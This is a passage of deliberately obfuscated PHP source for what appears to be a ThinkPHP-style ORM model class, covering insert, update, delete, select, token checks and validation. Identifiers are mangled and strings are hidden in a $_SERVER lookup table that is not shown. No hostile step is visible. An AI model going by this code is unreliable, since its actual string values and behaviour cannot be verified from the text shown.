$this->tablePrefix ? $this->tablePrefix : think_config($‡±Ü®²[296]); } $this->db(0, empty($this->connection) ? $û×Ú°€æ : $this->connection); $this->_classObjectID = mt_rand(0, 10000); } protected function _checkTableInfo() { $šìçÎñ† =& $_SERVER[ˆûùúÊ¯]; if (empty($this->fields)) { if (think_config($šìçÎñ†[297])) { $şá™¥­Ó = $this->dbName ? $this->dbName : think_config($šìçÎñ†[298]); $÷÷ğÓ’‡ = think_var_cache($šìçÎñ†[299] . strtolower(get_path_this($şá™¥­Ó) . $šìçÎñ†[10] . $this->name)); if ($÷÷ğÓ’‡) { $‡ºé ç = think_config($šìçÎñ†[300]); if (empty($‡ºé ç) || $÷÷ğÓ’‡[$šìçÎñ†[301]] == $‡ºé ç) { $this->fields = $÷÷ğÓ’‡; return; } } } $this->flush(); } } public function flush() { $¡«şì³™ =& $_SERVER[ˆûùúÊ¯]; $this->db->setModel($this->name); $ëëÄşÄÍ = $this->db->getFields($this->getTableName()); if (!$ëëÄşÄÍ) { return !1; } $this->fields = array_keys($ëëÄşÄÍ); $this->fields[$¡«şì³™[302]] = !1; foreach ($ëëÄşÄÍ as $ßêí¢Éê => $ ¾¨Œğª) { $”£ùœúÚ[$ßêí¢Éê] = $ ¾¨Œğª[$¡«şì³™[43]]; if ($ ¾¨Œğª[$¡«şì³™[49]]) { $this->fields[$¡«şì³™[303]] = $ßêí¢Éê; if ($ ¾¨Œğª[$¡«şì³™[52]]) { $this->fields[$¡«şì³™[302]] = !0; } } } $this->fields[$¡«şì³™[304]] = $”£ùœúÚ; if (think_config($¡«şì³™[300])) { $this->fields[$¡«şì³™[301]] = think_config($¡«şì³™[300]); } if (think_config($¡«şì³™[297])) { $é¿‡¹Ò = $this->dbName ? $this->dbName : think_config($¡«şì³™[298]); think_var_cache($¡«şì³™[299] . strtolower(get_path_this($é¿‡¹Ò) . $¡«şì³™[10] . $this->name), $this->fields); } } public function switchModel($àÌø”å³, $ù®¿Îë˜ = array()) { $êğ˜ÍÏû =& $_SERVER[ˆûùúÊ¯]; $»„¾¯ˆ = ucwords(strtolower($àÌø”å³)) . $êğ˜ÍÏû[305]; if (!class_exists($»„¾¯ˆ)) { think_exception($»„¾¯ˆ . think_lang($êğ˜ÍÏû[306])); } $this->_extModel = new $»„¾¯ˆ($this->name); if (!empty($ù®¿Îë˜)) { foreach ($ù®¿Îë˜ as $ÇŒÈÈ³) { $this->_extModel->setProperty($ÇŒÈÈ³, $this->{$ÇŒÈÈ³}); } } return $this->_extModel; } public function __set($³Ö°åãò, $÷»¡œ¤å) { $this->data[$³Ö°åãò] = $÷»¡œ¤å; } public function __get($í¦‘‚ıƒ) { return isset($this->data[$í¦‘‚ıƒ]) ? $this->data[$í¦‘‚ıƒ] : null; } public function __isset($üÖĞ½ôÖ) { return isset($this->data[$üÖĞ½ôÖ]); } public function __unset($ßÃ‡ ¢¼) { unset($this->data[$ßÃ‡ ¢¼]); } public function __call($Öğ¾·‡¹, $úôÅ¦‹°) { $€ìŞ‡õ =& $_SERVER[ˆûùúÊ¯]; if (in_array(strtolower($Öğ¾·‡¹), $this->methods, !0)) { $this->options[strtolower($Öğ¾·‡¹)] = $úôÅ¦‹°[0]; return $this; } elseif (in_array(strtolower($Öğ¾·‡¹), array($€ìŞ‡õ[307], $€ìŞ‡õ[308], $€ìŞ‡õ[309], $€ìŞ‡õ[310], $€ìŞ‡õ[311]), !0)) { $ÕÆ¾´ğì = isset($úôÅ¦‹°[0]) ? $úôÅ¦‹°[0] : $€ìŞ‡õ[212]; $ÕÆ¾´ğì = $this->db->parseKey($ÕÆ¾´ğì); return $this->getField(strtoupper($Öğ¾·‡¹) . $€ìŞ‡õ[312] . $ÕÆ¾´ğì . $€ìŞ‡õ[313] . $Öğ¾·‡¹, $€ìŞ‡õ[307]); } elseif (strtolower(substr($Öğ¾·‡¹, 0, 5)) == $€ìŞ‡õ[314]) { $ÕÆ¾´ğì = think_parse_name(substr($Öğ¾·‡¹, 5)); $…¢ö’†[$ÕÆ¾´ğì] = $úôÅ¦‹°[0]; return $this->where($…¢ö’†)->find(); } elseif (strtolower(substr($Öğ¾·‡¹, 0, 10)) == $€ìŞ‡õ[315]) { $€Ó…¥¬» = think_parse_name(substr($Öğ¾·‡¹, 10)); $…¢ö’†[$€Ó…¥¬»] = $úôÅ¦‹°[0]; return $this->where($…¢ö’†)->getField($úôÅ¦‹°[1]); } elseif (isset($this->_scope[$Öğ¾·‡¹])) { return $this->scope($Öğ¾·‡¹, $úôÅ¦‹°[0]); } elseif (method_exists($this, $Öğ¾·‡¹)) { array_unshift($úôÅ¦‹°, $Öğ¾·‡¹); return call_user_func_array(array($this, $€ìŞ‡õ[316]), $úôÅ¦‹°); } else { return call_user_func_array(array(parent, $Öğ¾·‡¹), $úôÅ¦‹°); } } protected function call() { $·˜ğË÷ =& $_SERVER[ˆûùúÊ¯]; $ÀĞ¡·ÛÎ = func_get_args(); $•…Õ¿Åƒ = array_shift($ÀĞ¡·ÛÎ); $—«ƒ¾ö´ = $•…Õ¿Åƒ; if (is_array($•…Õ¿Åƒ)) { $—«ƒ¾ö´ = $•…Õ¿Åƒ[1]; $•…Õ¿Åƒ = $•…Õ¿Åƒ[0]; } $”ÃÑ²“÷ = count($ÀĞ¡·ÛÎ) - 1; if (isset($ÀĞ¡·ÛÎ[$”ÃÑ²“÷]) && $ÀĞ¡·ÛÎ[$”ÃÑ²“÷] === $•…Õ¿Åƒ) { think_exception(__CLASS__ . $·˜ğË÷[4] . $•…Õ¿Åƒ . think_lang($·˜ğË÷[317])); return; } $ÀĞ¡·ÛÎ[] = $•…Õ¿Åƒ; if (method_exists($this, $·˜ğË÷[318])) { $Õö‘ôµ· = call_user_func_array(array($this, $·˜ğË÷[319]), array($—«ƒ¾ö´, $ÀĞ¡·ÛÎ)); if (!is_null($Õö‘ôµ·) && $Õö‘ôµ· !== !1) { return $Õö‘ôµ·; } } $ÔèĞºÅÅ = call_user_func_array(array($this, $•…Õ¿Åƒ), $ÀĞ¡·ÛÎ); if (method_exists($this, $·˜ğË÷[320])) { $Õö‘ôµ· = call_user_func_array(array($this, $·˜ğË÷[321]), array($—«ƒ¾ö´, $ÀĞ¡·ÛÎ, $ÔèĞºÅÅ)); if ($Õö‘ôµ·) { return $Õö‘ôµ·; } } return $ÔèĞºÅÅ; } protected function _initialize() { } protected function _facade($Ù³Í©çï) { $­ÃèáªŒ =& $_SERVER[ˆûùúÊ¯]; if (!empty($this->fields)) { foreach ($Ù³Í©çï as $÷ê±ûÜ => $‡üò‚¥) { if (is_array($this->fields) && !in_array($÷ê±ûÜ, $this->fields, !0)) { unset($Ù³Í©çï[$÷ê±ûÜ]); } elseif (is_scalar($‡üò‚¥)) { $this->_parseType($Ù³Í©çï, $÷ê±ûÜ); } } } if (!empty($this->options[$­ÃèáªŒ[322]])) { $Ù³Í©çï = array_map($this->options[$­ÃèáªŒ[322]], $Ù³Í©çï); unset($this->options[$­ÃèáªŒ[322]]); } $this->_beforeWrite($Ù³Í©çï); return $Ù³Í©çï; } protected function _beforeWrite(&$Ñ…â¬ì ) { } public function add($Å÷ÈµÔÔ = '', $‹æê¡†Ã = array(), $ãÊ¿æ = false) { if (empty($Å÷ÈµÔÔ)) { if (!empty($this->data)) { $Å÷ÈµÔÔ = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[ˆûùúÊ¯][323]); return !1; } } $‹æê¡†Ã = $this->_parseOptions($‹æê¡†Ã); $Å÷ÈµÔÔ = $this->_facade($Å÷ÈµÔÔ); if (!1 === $this->_beforeInsert($Å÷ÈµÔÔ, $‹æê¡†Ã)) { return !1; } $Ã£Ûİâï = $this->db->insert($Å÷ÈµÔÔ, $‹æê¡†Ã, $ãÊ¿æ); if (!1 !== $Ã£Ûİâï) { $‘Àû²ß = $this->getLastInsID(); if ($‘Àû²ß) { $Å÷ÈµÔÔ[$this->getPk()] = $‘Àû²ß; $this->_after_insert($Å÷ÈµÔÔ, $‹æê¡†Ã); return $‘Àû²ß; } $this->_after_insert($Å÷ÈµÔÔ, $‹æê¡†Ã); } return $Ã£Ûİâï; } protected function _beforeInsert(&$¾ŸäÉû, $Û©ˆß™) { } protected function _after_insert($Àèïßò¡, $—„şÚ™¢) { } public function addAll($Ğ³½óÅ , $“ªÜª‹ñ = array(), $Ñßš¢¹ = false) { $¨Ş†• =& $_SERVER[ˆûùúÊ¯]; if (empty($Ğ³½óÅ )) { $this->error = think_lang($¨Ş†•[323]); return !1; } $“ªÜª‹ñ = $this->_parseOptions($“ªÜª‹ñ); foreach ($Ğ³½óÅ  as $‰ ó¢÷ù => $¡Ïˆö¢) { $Ğ³½óÅ [$‰ ó¢÷ù] = $this->_facade($¡Ïˆö¢); } if (method_exists($this->db, $¨Ş†•[324])) { $êìæóçÖ = $this->db->insertAll($Ğ³½óÅ , $“ªÜª‹ñ, $Ñßš¢¹); } else { $this->startTrans(); foreach ($Ğ³½óÅ  as $‰ ó¢÷ù => $¡Ïˆö¢) { $êìæóçÖ = $this->db->insert($¡Ïˆö¢, $“ªÜª‹ñ, $Ñßš¢¹); } $this->commit(); } if (!1 !== $êìæóçÖ) { $¡ÊÁæ° = $this->getLastInsID(); if ($¡ÊÁæ°) { return $¡ÊÁæ°; } } return $êìæóçÖ; } public function selectAdd($õÊœ§çí = '', $ëªç´Ò« = '', $‘ÃÙÚ¿ = array()) { $Œ¸±¥ =& $_SERVER[ˆûùúÊ¯]; $‘ÃÙÚ¿ = $this->_parseOptions($‘ÃÙÚ¿); if (!1 === ($Œ®ô”ŒË = $this->db->selectInsert($õÊœ§çí ? $õÊœ§çí : $‘ÃÙÚ¿[$Œ¸±¥[325]], $ëªç´Ò« ? $ëªç´Ò« : $this->getTableName(), $‘ÃÙÚ¿))) { $this->error = think_lang($Œ¸±¥[326]); return !1; } else { return $Œ®ô”ŒË; } } public function save($‘€—³„ë = '', $äÉå…Ò÷ = array()) { $Œ†×‚ë =& $_SERVER[ˆûùúÊ¯]; if (empty($‘€—³„ë)) { if (!empty($this->data)) { $‘€—³„ë = $this->data; $this->data = array(); } else { $this->error = think_lang($Œ†×‚ë[323]); return !1; } } $‘€—³„ë = $this->_facade($‘€—³„ë); $äÉå…Ò÷ = $this->_parseOptions($äÉå…Ò÷); $Â‰æÄÔº = $this->getPk(); if (!isset($äÉå…Ò÷[$Œ†×‚ë[327]])) { if (isset($‘€—³„ë[$Â‰æÄÔº])) { $«í¼Òƒ[$Â‰æÄÔº] = $‘€—³„ë[$Â‰æÄÔº]; $äÉå…Ò÷[$Œ†×‚ë[327]] = $«í¼Òƒ; unset($‘€—³„ë[$Â‰æÄÔº]); } else { $this->error = think_lang($Œ†×‚ë[326]); return !1; } } if (is_array($äÉå…Ò÷[$Œ†×‚ë[327]]) && isset($äÉå…Ò÷[$Œ†×‚ë[327]][$Â‰æÄÔº])) { $Øó•òšô = $äÉå…Ò÷[$Œ†×‚ë[327]][$Â‰æÄÔº]; } if (!1 === $this->_beforeUpdate($‘€—³„ë, $äÉå…Ò÷)) { return !1; } $¼ñË™¼§ = $this->db->update($‘€—³„ë, $äÉå…Ò÷); if (!1 !== $¼ñË™¼§) { if (isset($Øó•òšô)) { $‘€—³„ë[$Â‰æÄÔº] = $Øó•òšô; } $this->_afterUpdate($‘€—³„ë, $äÉå…Ò÷); } return $¼ñË™¼§; } protected function _beforeUpdate(&$º³—Û , $›õË¾ï¢) { } protected function _afterUpdate($À¥‡¾¶’, $úŸ»š¯Í) { } public function delete($Îú¥„Å› = array()) { $Ûä¹ÆÀÖ =& $_SERVER[ˆûùúÊ¯]; if (empty($Îú¥„Å›) && empty($this->options[$Ûä¹ÆÀÖ[327]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $¹³ÎéŠë = $this->getPk(); if (is_numeric($Îú¥„Å›) || is_string($Îú¥„Å›)) { if (strpos($Îú¥„Å›, $Ûä¹ÆÀÖ[60])) { $§ëß’‹²[$¹³ÎéŠë] = array($Ûä¹ÆÀÖ[328], $Îú¥„Å›); } else { $§ëß’‹²[$¹³ÎéŠë] = $Îú¥„Å›; } $this->options[$Ûä¹ÆÀÖ[327]] = $§ëß’‹²; } $Îú¥„Å› = $this->_parseOptions(); if (is_array($Îú¥„Å›[$Ûä¹ÆÀÖ[327]]) && isset($Îú¥„Å›[$Ûä¹ÆÀÖ[327]][$¹³ÎéŠë])) { $ñ¦–âªÅ = $Îú¥„Å›[$Ûä¹ÆÀÖ[327]][$¹³ÎéŠë]; } $ıœİãçÔ = $this->db->delete($Îú¥„Å›); if (!1 !== $ıœİãçÔ) { $İäÍ–ôÙ = array(); if (isset($ñ¦–âªÅ)) { $İäÍ–ôÙ[$¹³ÎéŠë] = $ñ¦–âªÅ; } $this->_after_delete($İäÍ–ôÙ, $Îú¥„Å›); } return $ıœİãçÔ; } protected function _after_delete($Ò€õ³ú¼, $ßíœîÜÑ) { } public function select($ÄÂÜÀ‘‰ = array()) { $ö¦Û¡—÷ =& $_SERVER[ˆûùúÊ¯]; if (is_string($ÄÂÜÀ‘‰) || is_numeric($ÄÂÜÀ‘‰)) { $õ°Ëı¯Œ = $this->getPk(); if (strpos($ÄÂÜÀ‘‰, $ö¦Û¡—÷[60])) { $Õ®¡”Êš[$õ°Ëı¯Œ] = array($ö¦Û¡—÷[328], $ÄÂÜÀ‘‰); } else { $Õ®¡”Êš[$õ°Ëı¯Œ] = $ÄÂÜÀ‘‰; } $this->options[$ö¦Û¡—÷[327]] = $Õ®¡”Êš; } elseif (!1 === $ÄÂÜÀ‘‰) { $ÄÂÜÀ‘‰ = $this->_parseOptions(); return $ö¦Û¡—÷[329] . $this->db->buildSelectSql($ÄÂÜÀ‘‰) . $ö¦Û¡—÷[330]; } $ÄÂÜÀ‘‰ = $this->_parseOptions(); $‰”£ô‚ = $this->db->select($ÄÂÜÀ‘‰); if (!1 === $‰”£ô‚) { return !1; } if (empty($‰”£ô‚)) { return null; } $this->_afterSelect($‰”£ô‚, $ÄÂÜÀ‘‰); return $‰”£ô‚; } protected function _afterSelect(&$èõ½½®», $úÖãç™Ù) { } public function buildSql($æìä‚¡œ = array()) { $Úô‘ĞŞ =& $_SERVER[ˆûùúÊ¯]; $æìä‚¡œ = $this->_parseOptions($æìä‚¡œ); return $Úô‘ĞŞ[329] . $this->db->buildSelectSql($æìä‚¡œ) . $Úô‘ĞŞ[330]; } public function optionsValue($¿¡æÄĞ‘ = null) { if (is_null($¿¡æÄĞ‘)) { return $this->options; } elseif (is_array($¿¡æÄĞ‘)) { $this->options = array_merge($this->options, $¿¡æÄĞ‘); } } protected function _parseOptions($²øĞ ¤å = array()) { $šîñ§Œ =& $_SERVER[ˆûùúÊ¯]; if (is_array($²øĞ ¤å)) { $²øĞ ¤å = array_merge($this->options, $²øĞ ¤å); } $this->options = array(); if (!isset($²øĞ ¤å[$šîñ§Œ[331]])) { $²øĞ ¤å[$šîñ§Œ[331]] = $this->getTableName(); $’åâäü = $this->fields; } else { $’åâäü = $this->getDbFields(); } if (!empty($²øĞ ¤å[$šîñ§Œ[332]])) { $²øĞ ¤å[$šîñ§Œ[331]] .= $šîñ§Œ[63] . $²øĞ ¤å[$šîñ§Œ[332]]; } $²øĞ ¤å[$šîñ§Œ[333]] = $this->name; if (isset($²øĞ ¤å[$šîñ§Œ[327]]) && is_array($²øĞ ¤å[$šîñ§Œ[327]]) && !empty($’åâäü) && !isset($²øĞ ¤å[$šîñ§Œ[334]]) && !isset($²øĞ ¤å[$šîñ§Œ[331]])) { foreach ($²øĞ ¤å[$šîñ§Œ[327]] as $õ“”á® => $ıĞœ¾ûâ) { $õ“”á® = trim($õ“”á®); if (in_array($õ“”á®, $’åâäü, !0)) { if (is_scalar($ıĞœ¾ûâ)) { $this->_parseType($²øĞ ¤å[$šîñ§Œ[327]], $õ“”á®); } } elseif (!is_numeric($õ“”á®) && $šîñ§Œ[11] != substr($õ“”á®, 0, 1) && !1 === strpos($õ“”á®, $šîñ§Œ[10]) && !1 === strpos($õ“”á®, $šîñ§Œ[312]) && !1 === strpos($õ“”á®, $šîñ§Œ[335]) && !1 === strpos($õ“”á®, $šîñ§Œ[336])) { unset($²øĞ ¤å[$šîñ§Œ[327]][$õ“”á®]); } } } $this->_options_filter($²øĞ ¤å); return $²øĞ ¤å; } protected function _options_filter(&$Ä¾ı‰£–) { } protected function _parseType(&$Ü¯–‘—ï, $“ÉÑå’œ) { $œ·ÀÃ»ï =& $_SERVER[ˆûùúÊ¯]; if (empty($this->options[$œ·ÀÃ»ï[337]][$œ·ÀÃ»ï[4] . $“ÉÑå’œ])) { $Ö‡À¸‡‹ = strtolower($this->fields[$œ·ÀÃ»ï[304]][$“ÉÑå’œ]); if (!1 !== strpos($Ö‡À¸‡‹, $œ·ÀÃ»ï[338])) { } elseif (!1 === strpos($Ö‡À¸‡‹, $œ·ÀÃ»ï[339]) && !1 !== strpos($Ö‡À¸‡‹, $œ·ÀÃ»ï[340])) { $Ü¯–‘—ï[$“ÉÑå’œ] = intval($Ü¯–‘—ï[$“ÉÑå’œ]); } elseif (!1 !== strpos($Ö‡À¸‡‹, $œ·ÀÃ»ï[341]) || !1 !== strpos($Ö‡À¸‡‹, $œ·ÀÃ»ï[342])) { $Ü¯–‘—ï[$“ÉÑå’œ] = floatval($Ü¯–‘—ï[$“ÉÑå’œ]); } elseif (!1 !== strpos($Ö‡À¸‡‹, $œ·ÀÃ»ï[343])) { $Ü¯–‘—ï[$“ÉÑå’œ] = (bool) $Ü¯–‘—ï[$“ÉÑå’œ]; } } } public function find($ĞÊÈºÂ÷ = array()) { $œ°™ØÒû =& $_SERVER[ˆûùúÊ¯]; if (is_numeric($ĞÊÈºÂ÷) || is_string($ĞÊÈºÂ÷)) { $¿¢ŸŠóÄ[$this->getPk()] = intval($ĞÊÈºÂ÷); $this->options[$œ°™ØÒû[327]] = $¿¢ŸŠóÄ; } $this->options[$œ°™ØÒû[344]] = 1; $ĞÊÈºÂ÷ = $this->_parseOptions(); $ë—ÜªÃ = $this->db->select($ĞÊÈºÂ÷); if (!1 === $ë—ÜªÃ) { return !1; } if (empty($ë—ÜªÃ)) { return null; } $this->data = $ë—ÜªÃ[0]; $this->_afterFind($this->data, $ĞÊÈºÂ÷); if (!empty($this->options[$œ°™ØÒû[345]])) { return $this->returnResult($this->data, $this->options[$œ°™ØÒû[345]]); } return $this->data; } protected function _afterFind(&$˜¬‰÷Öâ, $Â‡´ÑÖÒ) { } protected function returnResult($ô‚Ûí…, $Ù´¿éËı = '') { $Ÿ½„ı·™ =& $_SERVER[ˆûùúÊ¯]; if ($Ù´¿éËı) { if (is_callable($Ù´¿éËı)) { return call_user_func($Ù´¿éËı, $ô‚Ûí…); } switch (strtolower($Ù´¿éËı)) { case $Ÿ½„ı·™[346]: return json_encode($ô‚Ûí…); case $Ÿ½„ı·™[347]: return xml_encode($ô‚Ûí…); } } return $ô‚Ûí…; } public function parseFieldsMap($ª ï” ¬, $ı¦Çö‹ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $Õü³Æ¥ => $˜ …Õ€) { if ($ı¦Çö‹ == 1) { if (isset($ª ï” ¬[$˜ …Õ€])) { $ª ï” ¬[$Õü³Æ¥] = $ª ï” ¬[$˜ …Õ€]; unset($ª ï” ¬[$˜ …Õ€]); } } else { if (isset($ª ï” ¬[$Õü³Æ¥])) { $ª ï” ¬[$˜ …Õ€] = $ª ï” ¬[$Õü³Æ¥]; unset($ª ï” ¬[$Õü³Æ¥]); } } } } return $ª ï” ¬; } public function setField($ß ¦ûõğ, $é×’—º¼ = '') { if (is_array($ß ¦ûõğ)) { $ªĞ¡åŸ = $ß ¦ûõğ; } else { $ªĞ¡åŸ[$ß ¦ûõğ] = $é×’—º¼; } return $this->save($ªĞ¡åŸ); } public function setAdd($ıéåĞ¶Î, $¡óáé¶ = 1) { $ê®›“á =& $_SERVER[ˆûùúÊ¯]; $™¬¼ò± = $ıéåĞ¶Î . $ê®›“á[348] . $¡óáé¶; if ($¡óáé¶ < 0) { $™¬¼ò± = $ıéåĞ¶Î . $¡óáé¶; } return $this->setField($ıéåĞ¶Î, array($ê®›“á[349], $™¬¼ò±)); } public function getField($’ÈÑ˜¶ó, $ƒ¿÷‰ƒ = null) { $æıÛ­ÂÁ =& $_SERVER[ˆûùúÊ¯]; $íõÓüìí[$æıÛ­ÂÁ[325]] = $’ÈÑ˜¶ó; $íõÓüìí = $this->_parseOptions($íõÓüìí); $’ÈÑ˜¶ó = trim($’ÈÑ˜¶ó); if (strpos($’ÈÑ˜¶ó, $æıÛ­ÂÁ[60])) { if (!isset($íõÓüìí[$æıÛ­ÂÁ[344]])) { $íõÓüìí[$æıÛ­ÂÁ[344]] = is_numeric($ƒ¿÷‰ƒ) ? $ƒ¿÷‰ƒ : $æıÛ­ÂÁ[12]; } $Ê¤ÇÅáÏ = $this->db->select($íõÓüìí); if (!empty($Ê¤ÇÅáÏ)) { $¼šø€” = explode($æıÛ­ÂÁ[60], $’ÈÑ˜¶ó); $’ÈÑ˜¶ó = array_keys($Ê¤ÇÅáÏ[0]); $Æ©½ÀÁÉ = array_shift($’ÈÑ˜¶ó); $®»°÷âÍ = array_shift($’ÈÑ˜¶ó); $½‡ÓÇÁ² = array(); $ìäü¤æï = count($¼šø€”); foreach ($Ê¤ÇÅáÏ as $ÔìË¨›î) { $è”­œÅ = $ÔìË¨›î[$Æ©½ÀÁÉ]; if (2 == $ìäü¤æï) { $½‡ÓÇÁ²[$è”­œÅ] = $ÔìË¨›î[$®»°÷âÍ]; } else { $½‡ÓÇÁ²[$è”­œÅ] = is_string($ƒ¿÷‰ƒ) ? implode($ƒ¿÷‰ƒ, $ÔìË¨›î) : $ÔìË¨›î; } } return $½‡ÓÇÁ²; } } else { if (!0 !== $ƒ¿÷‰ƒ) { $íõÓüìí[$æıÛ­ÂÁ[344]] = is_numeric($ƒ¿÷‰ƒ) ? $ƒ¿÷‰ƒ : 1; } if ($ƒ¿÷‰ƒ === $æıÛ­ÂÁ[307]) { unset($íõÓüìí[$æıÛ­ÂÁ[344]]); } $ÔìË¨›î = $this->db->select($íõÓüìí); if (!empty($ÔìË¨›î)) { if ($ƒ¿÷‰ƒ === $æıÛ­ÂÁ[307]) { return reset($ÔìË¨›î[0]); } if (!0 !== $ƒ¿÷‰ƒ && 1 == $íõÓüìí[$æıÛ­ÂÁ[344]]) { return reset($ÔìË¨›î[0]); } foreach ($ÔìË¨›î as $•Ú©ù») { $ŸµÍœ´Å[] = $•Ú©ù»[$’ÈÑ˜¶ó]; } return $ŸµÍœ´Å; } } return null; } public function create($íÄó³²ƒ = '', $ìÎı¡–¥ = '') { $˜İÛ¥Òø =& $_SERVER[ˆûùúÊ¯]; if (empty($íÄó³²ƒ)) { $íÄó³²ƒ = $_POST; } elseif (is_object($íÄó³²ƒ)) { $íÄó³²ƒ = get_object_vars($íÄó³²ƒ); } if (empty($íÄó³²ƒ) || !is_array($íÄó³²ƒ)) { $this->error = think_lang($˜İÛ¥Òø[323]); return !1; } $íÄó³²ƒ = $this->parseFieldsMap($íÄó³²ƒ, 0); $ìÎı¡–¥ = $ìÎı¡–¥ ? $ìÎı¡–¥ : (!empty($íÄó³²ƒ[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$˜İÛ¥Òø[325]])) { $üÇößÇ = $this->options[$˜İÛ¥Òø[325]]; unset($this->options[$˜İÛ¥Òø[325]]); } elseif ($ìÎı¡–¥ == THINK_MODEL_INSERT && isset($this->insertFields)) { $üÇößÇ = $this->insertFields; } elseif ($ìÎı¡–¥ == THINK_MODEL_UPDATE && isset($this->updateFields)) { $üÇößÇ = $this->updateFields; } if (isset($üÇößÇ)) { if (is_string($üÇößÇ)) { $üÇößÇ = explode($˜İÛ¥Òø[60], $üÇößÇ); } if (think_config($˜İÛ¥Òø[350])) { $üÇößÇ[] = think_config($˜İÛ¥Òø[351]); } foreach ($íÄó³²ƒ as $©ì¹İ¶¬ => $õ‚Ã‹Ìõ) { if (!in_array($©ì¹İ¶¬, $üÇößÇ)) { unset($íÄó³²ƒ[$©ì¹İ¶¬]); } } } if (!$this->autoValidation($íÄó³²ƒ, $ìÎı¡–¥)) { return !1; } if (!$this->autoCheckToken($íÄó³²ƒ)) { $this->error = think_lang($˜İÛ¥Òø[352]); return !1; } if ($this->autoCheckFields) { $üÇößÇ = $this->getDbFields(); foreach ($íÄó³²ƒ as $©ì¹İ¶¬ => $õ‚Ã‹Ìõ) { if (!in_array($©ì¹İ¶¬, $üÇößÇ)) { unset($íÄó³²ƒ[$©ì¹İ¶¬]); } elseif (MAGIC_QUOTES_GPC && is_string($õ‚Ã‹Ìõ)) { $íÄó³²ƒ[$©ì¹İ¶¬] = stripslashes($õ‚Ã‹Ìõ); } } } $this->autoOperation($íÄó³²ƒ, $ìÎı¡–¥); $this->data = $íÄó³²ƒ; return $íÄó³²ƒ; } public function autoCheckToken($³¿¸¯ƒ¾) { $‡Ğ˜§¤ =& $_SERVER[ˆûùúÊ¯]; if (isset($this->options[$‡Ğ˜§¤[353]]) && !$this->options[$‡Ğ˜§¤[353]]) { return !0; } if (think_config($‡Ğ˜§¤[350])) { $É¹²‹õ = think_config($‡Ğ˜§¤[351]); if (!isset($³¿¸¯ƒ¾[$É¹²‹õ]) || Session::get($É¹²‹õ)) { return !1; } list($Œìêø¿, $ËÏ®ßõ­) = explode($‡Ğ˜§¤[11], $³¿¸¯ƒ¾[$É¹²‹õ]); if ($ËÏ®ßõ­ && Session::get($É¹²‹õ . $‡Ğ˜§¤[10] . $Œìêø¿) === $ËÏ®ßõ­) { Session::remove($É¹²‹õ . $‡Ğ˜§¤[10] . $Œìêø¿); return !0; } if (think_config($‡Ğ˜§¤[354])) { Session::remove($É¹²‹õ . $‡Ğ˜§¤[10] . $Œìêø¿); } return !1; } return !0; } public function regex($Ä­µÄ§Ñ, $òÅˆÆçí) { $©†ãš€¨ =& $_SERVER[ˆûùúÊ¯]; $·€¨Î©ˆ = array($©†ãš€¨[355] => $©†ãš€¨[356], $©†ãš€¨[357] => $©†ãš€¨[358], $©†ãš€¨[359] => $©†ãš€¨[360], $©†ãš€¨[361] => $©†ãš€¨[362], $©†ãš€¨[363] => $©†ãš€¨[364], $©†ãš€¨[365] => $©†ãš€¨[366], $©†ãš€¨[367] => $©†ãš€¨[368], $©†ãš€¨[342] => $©†ãš€¨[369], $©†ãš€¨[370] => $©†ãš€¨[371]); if (isset($·€¨Î©ˆ[strtolower($òÅˆÆçí)])) { $òÅˆÆçí = $·€¨Î©ˆ[strtolower($òÅˆÆçí)]; } return preg_match($òÅˆÆçí, $Ä­µÄ§Ñ) === 1; } private function autoOperation(&$Ÿ¹ÓÍ™¾, $„ß¼Šå×) { $¬û¦Ø™Ë =& $_SERVER[ˆûùúÊ¯]; if (!empty($this->options[$¬û¦Ø™Ë[372]])) { $õêã€ê = $this->options[$¬û¦Ø™Ë[372]]; unset($this->options[$¬û¦Ø™Ë[372]]); } elseif (!empty($this->_auto)) { $õêã€ê = $this->_auto; } if (isset($õêã€ê)) { foreach ($õêã€ê as $÷§†÷«¿) { if (empty($÷§†÷«¿[2])) { $÷§†÷«¿[2] = THINK_MODEL_INSERT; } if ($„ß¼Šå× == $÷§†÷«¿[2] || $÷§†÷«¿[2] == THINK_MODEL_BOTH) { switch (trim($÷§†÷«¿[3])) { case $¬û¦Ø™Ë[373]: case $¬û¦Ø™Ë[374]: $Å‰Ş›ü‚ = isset($÷§†÷«¿[4]) ? (array) $÷§†÷«¿[4] : array(); if (isset($Ÿ¹ÓÍ™¾[$÷§†÷«¿[0]])) { array_unshift($Å‰Ş›ü‚, $Ÿ¹ÓÍ™¾[$÷§†÷«¿[0]]); } if ($¬û¦Ø™Ë[373] == $÷§†÷«¿[3]) { $Ÿ¹ÓÍ™¾[$÷§†÷«¿[0]] = call_user_func_array($÷§†÷«¿[1], $Å‰Ş›ü‚); } else { $Ÿ¹ÓÍ™¾[$÷§†÷«¿[0]] = call_user_func_array(array(&$this, $÷§†÷«¿[1]), $Å‰Ş›ü‚); } break; case $¬û¦Ø™Ë[325]: $Ÿ¹ÓÍ™¾[$÷§†÷«¿[0]] = $Ÿ¹ÓÍ™¾[$÷§†÷«¿[1]]; break; case $¬û¦Ø™Ë[375]: if ($¬û¦Ø™Ë[12] === $Ÿ¹ÓÍ™¾[$÷§†÷«¿[0]]) { unset($Ÿ¹ÓÍ™¾[$÷§†÷«¿[0]]); } break; case $¬û¦Ø™Ë[376]: default: $Ÿ¹ÓÍ™¾[$÷§†÷«¿[0]] = $÷§†÷«¿[1]; } if (!1 === $Ÿ¹ÓÍ™¾[$÷§†÷«¿[0]]) { unset($Ÿ¹ÓÍ™¾[$÷§†÷«¿[0]]); } } } } return $Ÿ¹ÓÍ™¾; } protected function autoValidation($êÚÉÍ•¤, $¼à¬œÊ’) { $‡àÛ±úŸ =& $_SERVER[ˆûùúÊ¯]; if (!empty($this->options[$‡àÛ±úŸ[377]])) { $àœò• = $this->options[$‡àÛ±úŸ[377]]; unset($this->options[$‡àÛ±úŸ[377]]); } elseif (!empty($this->_validate)) { $àœò• = $this->_validate; } if (isset($àœò•)) { if ($this->patchValidate) { $this->error = array(); } foreach ($àœò• as $æèúôÓò => $úùÏ) { if (empty($úùÏ[5]) || $úùÏ[5] == THINK_MODEL_BOTH || $úùÏ[5] == $¼à¬œÊ’) { if (0 == strpos($úùÏ[2], $‡àÛ±úŸ[378]) && strpos($úùÏ[2], $‡àÛ±úŸ[379])) { $úùÏ[2] = think_lang(substr($úùÏ[2], 2, -1)); } $úùÏ[3] = 